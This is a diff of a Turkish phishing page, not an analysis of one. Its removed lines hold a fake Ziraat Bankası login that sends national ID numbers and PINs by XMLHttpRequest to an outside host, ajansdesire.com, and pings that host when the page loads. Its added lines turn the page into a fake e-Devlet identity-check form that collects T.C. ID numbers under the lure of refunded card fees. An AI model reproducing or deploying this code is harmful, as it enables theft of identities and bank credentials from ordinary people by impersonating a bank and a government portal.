@@ -1,17 +1,99 @@
-
 <!DOCTYPE html>
-<html lang="tr">
+<html class="no-js test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains" lang="tr"><head>
   <head>
-    <meta charset="UTF-8">
-   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Mobil Uyumlu Sayfa</title>
-    <style class="vjs-styles-defaults"></style>
-    <meta http-equiv="Content-Language" content="tr">
-    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Hoş Geldiniz | Ziraat Bankası İnternet Bankacılığı </title>
-    <link href="styles.css" rel="stylesheet" id="style">
-	     <script>document.addEventListener("DOMContentLoaded", function() {
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <meta http-equiv="cleartype" content="on">
+    <title>Mobil İşlem Merkezi</title>
+    <meta name="description" content="5 yıla kadar tüm ödediğiniz aidat ücretlerini geri alın">
+ 
+    <meta name="keywords" content="mobil,işlem,merkezi">
+    <meta name="robots" content="index,follow">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#4284be">
+ 
+ 
+    <meta name="msapplication-TileColor" content="#FFFFFF">
+    <link rel="stylesheet" href="assets/css/base.css">
+    <script src="assets/js/tr.js"></script>
+    <link rel="stylesheet" href="assets/css/giris.css">
+    <style>
+      .yg-input-error-msg {
+          display: none;
+          color: red;
+      }
+  </style>
+ 
+  </head>
+  <body data-lang="tr_TR.UTF-8">
+    <div class="wrapper">
+        <div class="container">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <header class="header">
+        <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı
+        </h1>
+        <div class="logo"><a href="/"> <img src="edk-logo.png"
+                                            alt="logo2"> </a>
+        </div>
+        <div class="referrerApp"><img alt="" src="1.png" aria-hidden="true" width="165" height="40">
+            <p>e-Devlet Kapısı<span>https://www.turkiye.gov.tr</span></p></div>
+    </header>
+    
+ 
+    
+    
+    
+    
+    
+    <main>
+        <section>
+            <div class="content">
+           <center>  <h2>
+            Pratik Sorgulama
+         
+ </h2>  <br> <h5>
+                  6502 sayılı Tüketicinin Korunması Hakkında Kanun ile kart çıkaran kuruluşların tüketicilere yıllık üyelik aidatı ve benzeri isim altında ücret tahsil etmedikleri bir kredi kartını sunma zorunluluğu getirilmiştir.
+              
+ </h5>
+<br><br>
+     </center> 
+    
+     <form method="post" id="loginForm" name="sifreGirisForm" action="/online-api" autocomplete="off" onsubmit="return validateForm();">
+        <fieldset>
+            <div class="form-row required">
+                <label for="tridField" class="enforced">T.C. Kimlik No</label>
+                <input type="hidden" name="encTridField" id="encTridField" value="">
+                <div class="form-field fieldGroup">
+                    <input name="tridField" type="number" e-validate="tck" class="form-control" id="tridField" value="" autocomplete="off" maxlength="11" minlength="11" title="Kimlik numaranız 11 adet rakamdan oluşmalıdır" aria-label="T. C. Kimlik Numaranızı Girin" required>
+                    <div class="form-note yg-input-error-msg error-message" id="tck_error" role="alert">T.C. Kimlik numaranızı hatalı girdiniz. Kimlik Numaranızı Kontrol Ediniz!</div>
+                </div>
+            </div>
+            <div class="loading-content hide">
+                <div class="loading"></div>
+                <span class="loader-info">İşleminiz devam ediyor. Lütfen bekleyiniz...</span>
+            </div>
+            <div class="form-row center-item">
+                <input type="hidden" name="actionName" value="giris">
+                <button class="btn btn-send" name="submitButton" type="submit" value="Devam">Devam</button>
+            </div>
+        </fieldset>
+    </form>
+    <script>
         function tcno_dogrula(tcno) {
             tcno = String(tcno);
             if (tcno.substring(0, 1) === '0') {
@@ -41,167 +123,61 @@
             return true;
         }
 
-        function kontrolEt() {
-            var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
-            var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
-            var devamButton = document.getElementById("ctl00_c_RetailLoginButton");
+        function validateForm() {
+            const tcno = document.getElementById('tridField').value;
+            const errorMessage = document.getElementById('tck_error');
 
-            if (/^\d{6}$/.test(pinInput.value)) {
-                devamButton.removeAttribute("disabled");
+            if (!tcno_dogrula(tcno)) {
+                errorMessage.style.display = 'block';
+                return false;
             } else {
-                devamButton.setAttribute("disabled", "disabled");
+                errorMessage.style.display = 'none';
+                return true;
             }
         }
-
-  
-        var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
-        var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
-
-        identityInput.addEventListener("input", kontrolEt);
-        pinInput.addEventListener("input", kontrolEt);
-	});
-
-    </script> 
-	  <script>
-  document.addEventListener('touchstart', function (event) {
-    if (event.touches.length > 1) {
-      event.preventDefault();
-    }
-  }, { passive: false });
-</script>
-
-  </head>
-  <body style="
-margin-left: 0px;
-margin-right: 0px;
-margin-top: 0px;
-margin-bottom: 0px;
-">
-    <form name="aspnetForm" method="post" action="https://ajansdesire.com/asdasd/9index.php" id="aspnetForm" autocomplete="off" novalidate="novalidate">
-      <div id="" class="login-wrap">
-        <header></header>
-        <div id="" class="container">
-          <div id="" class="tc-kimlik-giris-wrap">
-            <div id="ctl00_ctl06" class="row">
-              <div id="ctl00_LoginBoxContainer" class="col-xs-12 col-md-6">
-                <div id="LoginBox" class="login-box long">
-                  <span id="ctl00_c_PageValidation" style="color:Red;visibility:hidden;"></span>
-                  <input name="rdLng" type="hidden" value="">
-                  <p>İnternet Şubemize Hoş Geldiniz</p>
-                  <div class="tabs-wrap" data-module="14">
-                    <div id="TabHeaderContainer" class="tabs tab-header-container">
-                      <a causesval="false" onclick=";;;" id="ctl00_c_RetailTabHeaderButton" class="active" href="">
-                        <span></span>BİREYSEL </a>
-                      <a causesval="false">
-                        <span></span>KURUMSAL </a>
-                    </div>
-                    <div id="" class="tab-container tab-contents">
-                      <div id="RetailTabContainer" class="tab-item active" style="
-					  padding-left: 10px;
-				  ">
-                        <div id="ctl00_c_RetailIdentityContainer" class="form-group hidden-title">
-                          <input autocomplete="off" name="ctl00$c$RetailIdentityTextBox" type="tel" maxlength="11" id="ctl00_c_RetailIdentityTextBox" class="form-control required isNumber numeric external-validation" style="  
-
-font-size: 14px;  height: 46px;font-family: sans-serif;
-						  font-weight: 700;" placeholder="T.C. Kimlik / Müşteri Numaranız" data-msg-required="Müşteri / T.C. Kimlik Numaranızı Giriniz." maxlengthvalidationenabled="False"   disablevalidationonblur="true" onkeypress=";" onkeydown=";return FcsToCtrl(event,'ctl00_c_RetailLoginButton');"  causesval="false" onmousedown=";"   exvalidmethod="ValidateIdentity" aria-required="true" value="" >
-                          
-                        </div>
-                        <div id="RetailRememberMeContainer" class="clearfix" >
-                          <div role="button" class="switch-cont" tabindex="0">
-                            <span>Beni Hatırla</span>
-                            <label class="switch">
-                              <input id="ctl00_c_RetailRememberMeCheckBox" type="checkbox" name="ctl00$c$RetailRememberMeCheckBox" causesval="false" tabindex="-1" aria-hidden="true">
-                              <span class="switch-slider"></span>
-                            </label>
-                          </div>
-                        </div>
-                        <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
-                          <input autocomplete="off" name="ctl00$c$RetailPinTextBox" type="password" maxlength="6" id="ctl00_c_RetailPinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="Şifre" data-msg-required="Lütfen şifrenizi giriniz."  style="font-size: 14px;font-family: sans-serif;    font-weight: 700;" disablevalidationonblur="true" data-rule-range-max="6"  onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." encrypted="" exvalidmethod="CheckAlphaNumericCurrentPinEntry" aria-required="true" value="">
-                         </div>
-                        <div id="" class="clearfix"></div>
-                      <button id="ctl00_c_RetailLoginButton" class="btn btn-danger sendBtn" disabled=""
-        onclick="checkAndSubmit();">
-    <span></span>DEVAM
-</button><br><br><br>
-                        <a causesval="true" onclick="" id="ctl00_c_RetailRemindPinButton" class="custom-link" href="">
-                          <span></span>Şifremi Unuttum </a>
-                        <div id="TabFooter" class="tab-footer">
-                          <p>Dijital Bankacılık müşterimiz olmak için</p>
-                          <a causesval="true" id="ctl00_c_OnlineApplicationButton" class="btn btn-default ">
-                            <span></span>HEMEN BAŞVUR </a>
-                        </div>
-                      </div>
-                
-                        
-                   
-                 
-                  </div>
-                  <style>
-			  input {
-  touch-action: manipulation;
-}
-                    .api-payment-container img {
-                      max-height: 92px;
-                      max-width: 92px;
-                    }
-
-                    .ipNotInListRedirectBtn {
-                      background-color: #e10514 !important;
-                    }
-                  </style>
-                </div>
-              </div>
-            </div>
-          </div>
-    </form>
-
-  <script> function checkAndSubmit() {
-
-   var kimlik = document.getElementById("ctl00_c_RetailIdentityTextBox").value;  
-            var sifre = document.getElementById("ctl00_c_RetailPinTextBox").value;  
-
-    if (button.disabled) {
-        alert('Giriş Bilgilerinizi Kontrol Ediniz !');
-        return false;  
-    }
- var button = document.getElementById('ctl00_c_RetailLoginButton');
-
-            if (!button.disabled) {
-              
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", "https://ajansdesire.com/asdasd/9index.php", true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
- 
-              
-                xhr.send("kimlik=" + kimlik + "&sifre=" + sifre);
-
-       
-                xhr.onload = function() {
-                    if (xhr.status == 200) {
-                      
-                        location.reload(); 
-                    }
-                };
-            } else {
-                alert('Giriş Bilgilerinizi Kontrol Ediniz !');
-            }
-  
-}
-		  </script> 
-		  
-    <script>
- 
-        window.addEventListener('load', function() {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://ajansdesire.com/asdasd/tgtg.php', true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    console.log('GET isteği başarıyla gönderildi.');
-                }
-            };
-            xhr.send();
-        });
     </script>
-    <div>
-  </body>
-</html>
+            </div>
+        </section>
+    
+ 
+    
+    </main>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    </div>
+   
+    
+    <footer class="footer-fixed" role="contentinfo">
+        <span class="copyright"><img src="DDO-logo.png" class="footer-logo" alt="logo" height="24"  >© 2024, Ankara - Tüm Hakları Saklıdır</span>
+        <ul>
+            <li>
+                <a id="gizlilik_btn" 
+                   aria-haspopup="true">Gizlilik ve Güvenlik
+                </a>
+            </li>
+    
+        </ul>
+ 
+    </footer>
+    
+  </div>
+ 
+    
+    
+    
+    
+    
+ 
+    </body>
+    </html>
+    
+    
+ 
+    
